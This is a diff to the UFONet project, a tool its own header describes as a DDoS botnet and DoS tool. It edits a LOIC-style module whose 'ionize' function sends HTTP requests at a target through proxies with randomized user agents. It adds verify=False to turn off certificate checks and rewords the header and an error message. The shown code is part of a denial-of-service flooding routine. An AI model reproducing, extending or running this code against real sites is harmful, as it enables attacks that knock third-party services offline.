@@ -1,7 +1,7 @@
 #!/usr/bin/env python 
 # -*- coding: utf-8 -*-"
 """
-UFONet - DDoS Botnet via Web Abuse - 2017 - by psy (epsylon@riseup.net)
+UFONet - (DDoS botnet + DoS tool) via Web Abuse - 2017/2018 - by psy (epsylon@riseup.net)
 
 You should have received a copy of the GNU General Public License along
 with UFONet; if not, write to the Free Software Foundation, Inc., 51
@@ -17,10 +17,10 @@ def ionize(self, target, proxy):
             }
         self.user_agent = random.choice(self.agents).strip()
         headers = {'User-Agent': str(self.user_agent)}
-        requests.get(target, headers=headers, proxies=proxyD)
+        requests.get(target, headers=headers, proxies=proxyD, verify=False)
         print "[Info] Firing 'pulse' from: LOIC -> Status: HIT!"
     except:
-        print("[Error] LOIC is failing to engage. Is still our target online?...")
+        print("[Error] LOIC is failing to engage. Is still target online?...")
         pass
 
 class LOIC(object):
